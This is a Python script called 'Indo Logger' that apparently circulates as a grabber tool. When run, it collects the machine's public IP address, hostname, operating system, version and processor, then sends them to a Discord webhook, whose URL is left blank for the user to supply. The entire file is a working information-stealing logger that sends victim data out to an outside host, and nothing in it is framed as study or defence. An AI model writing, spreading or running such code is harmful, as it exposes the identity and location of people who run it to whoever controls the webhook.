import platform
from requests import get
from discord_webhook import DiscordWebhook, DiscordEmbed

ip = get('https://api.ipify.org').text
uname = platform.uname()
webhook = DiscordWebhook (url="Your Webhook Url", username="Indo Logger",
avatar_url="https://media.discordapp.net/attachments/1128387189634502657/1140650608941076622/c773b2daac52ab471623bc4116f6eaa3.png")


embed = DiscordEmbed(
    title="Indo Logger", description="<a:bcoroa_fire:996560652334272554>  System Informatique  <a:bcoroa_fire:996560652334272554>", color=0
)
embed.set_author(
    name="Indo Logger",
    url="https://github.com/IndoAkaMasao",
    icon_url="https://media.discordapp.net/attachments/1128387189634502657/1140650608941076622/c773b2daac52ab471623bc4116f6eaa3.png",
)
embed.set_footer(text="Created By IndoAkaMasao")
embed.add_embed_field(name="<:hackerblack:1095747410539593800> Operating System", value= f"{uname.system} ",inline=False)
embed.add_embed_field(name="<a:blackworld:1095741984385290310> System Name", value= f"{uname.node} ", inline=False)
embed.add_embed_field(name="<:b_lovekanji:1003875272862470234> Windows Version", value= f"{uname.release} ", inline=False)
embed.add_embed_field(name="<a:black_hypesquad:1095742323423453224> Processor", value= f"{uname.processor} ", inline=False)
embed.add_embed_field(name="<:blackmember:1095740314683179139> Public Ip", value='{}'.format(ip), inline=False)
webhook.add_embed(embed)
response = webhook.execute()
